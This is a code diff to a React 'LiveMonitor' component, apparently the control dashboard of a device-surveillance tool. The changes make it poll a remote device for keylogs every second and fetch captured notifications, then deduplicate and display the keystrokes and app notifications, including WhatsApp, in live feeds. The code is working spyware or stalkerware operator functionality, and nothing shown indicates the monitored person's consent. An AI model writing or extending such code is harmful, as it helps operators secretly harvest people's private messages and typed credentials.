@@ -1,4 +1,4 @@
-import React, { useRef, useEffect, useState } from 'react';
+import React, { useRef, useEffect, useState, useMemo } from 'react';
 
 const APP_COLORS = {
   'com.whatsapp': '#25D366',
@@ -25,6 +25,26 @@ function appShort(pkg) {
 
 function friendlyName(entry) {
   return entry?.appName || (entry?.packageName?.split('.').pop()) || 'Unknown';
+}
+
+function dedupeKeylogs(entries) {
+  const seen = new Set();
+  return entries.filter(k => {
+    const key = `${k.packageName}|${k.timestamp}|${k.text}`;
+    if (seen.has(key)) return false;
+    seen.add(key);
+    return true;
+  });
+}
+
+function dedupeNotifs(entries) {
+  const seen = new Set();
+  return entries.filter(n => {
+    const key = `${n.packageName}|${n.postTime || n.timestamp}|${n.title}|${n.text}`;
+    if (seen.has(key)) return false;
+    seen.add(key);
+    return true;
+  });
 }
 
 function ColHeader({ icon, title, count, live }) {
@@ -57,7 +77,7 @@ function NotifFeed({ entries }) {
       {entries.map((n, i) => {
         const color = getAppColor(n.packageName);
         return (
-          <div key={`n-${i}-${n.postTime}`} className="lm-entry">
+          <div key={`n-${i}-${n.postTime}-${n.title}`} className="lm-entry">
             <div className="lm-badge" style={{ background: color + '22', borderColor: color + '55', color }}>
               {appShort(n.packageName)}
             </div>
@@ -134,7 +154,7 @@ function KeylogFeed({ entries }) {
       {entries.map((k, i) => {
         const color = getAppColor(k.packageName);
         return (
-          <div key={`k-${i}-${k.timestamp}`} className="lm-entry">
+          <div key={`k-${i}-${k.timestamp}-${k.text}`} className="lm-entry">
             <div className="lm-badge" style={{ background: color + '22', borderColor: color + '55', color }}>
               {appShort(k.packageName)}
             </div>
@@ -153,15 +173,81 @@ function KeylogFeed({ entries }) {
   );
 }
 
-export default function LiveMonitor({ notifEntries, activityEntries, keylogEntries }) {
-  const notifs   = (notifEntries    || []).slice(0, 100);
+export default function LiveMonitor({ notifEntries, activityEntries, keylogEntries, device, sendCommand, results }) {
+  const [fetchedKeylogs, setFetchedKeylogs] = useState([]);
+  const [fetchedNotifs, setFetchedNotifs]   = useState([]);
+  const seenResultIds = useRef(new Set());
+
+  const deviceId = device?.deviceId;
+  const isOnline = device?.isOnline;
+
+  // ── Fetch keylogs immediately, then every 1 second ──────────────────
+  useEffect(() => {
+    if (!isOnline || !sendCommand || !deviceId) return;
+
+    const fetch = () => sendCommand(deviceId, 'get_keylogs', { limit: 200 });
+    fetch();
+    const id = setInterval(fetch, 1000);
+    return () => clearInterval(id);
+  }, [isOnline, deviceId, sendCommand]);
+
+  // ── Fetch notifications once on mount ───────────────────────────────
+  useEffect(() => {
+    if (!isOnline || !sendCommand || !deviceId) return;
+    sendCommand(deviceId, 'get_notifications', { limit: 100 });
+  }, [isOnline, deviceId, sendCommand]);
+
+  // ── Parse command results for keylogs and notifications ─────────────
+  useEffect(() => {
+    if (!results) return;
+    results.forEach(r => {
+      if (seenResultIds.current.has(r.id)) return;
+      if (!r.success || !r.response) return;
+      if (r.command === 'get_keylogs') {
+        seenResultIds.current.add(r.id);
+        try {
+          const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
+          if (d.logs) setFetchedKeylogs(d.logs);
+        } catch (_) {}
+      }
+      if (r.command === 'get_notifications') {
+        seenResultIds.current.add(r.id);
+        try {
+          const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
+          if (d.notifications) {
+            setFetchedNotifs(prev => {
+              const combined = [...d.notifications, ...prev];
+              const seen = new Set();
+              return combined.filter(n => {
+                const key = `${n.packageName}|${n.postTime}|${n.title}|${n.text}`;
+                if (seen.has(key)) return false;
+                seen.add(key);
+                return true;
+              }).slice(0, 100);
+            });
+          }
+        } catch (_) {}
+      }
+    });
+  }, [results]);
+
+  // ── Merge push + fetched, dedupe ────────────────────────────────────
+  const notifs = useMemo(() =>
+    dedupeNotifs([...(notifEntries || []), ...fetchedNotifs]).slice(0, 100),
+    [notifEntries, fetchedNotifs]
+  );
+
   const activity = (activityEntries || []).slice(0, 100);
-  const keylogs  = (keylogEntries   || []).slice(0, 200);
+
+  const keylogs = useMemo(() =>
+    dedupeKeylogs([...(keylogEntries || []), ...fetchedKeylogs]).slice(0, 200),
+    [keylogEntries, fetchedKeylogs]
+  );
 
   return (
     <div className="live-monitor">
       <div className="lm-col">
-        <ColHeader icon="🔔" title="Notifications" count={notifs.length} live={notifs.length > 0} />
+        <ColHeader icon="🔔" title="Notifications" count={notifs.length} live={notifEntries?.length > 0} />
         <NotifFeed entries={notifs} />
       </div>
       <div className="lm-col">
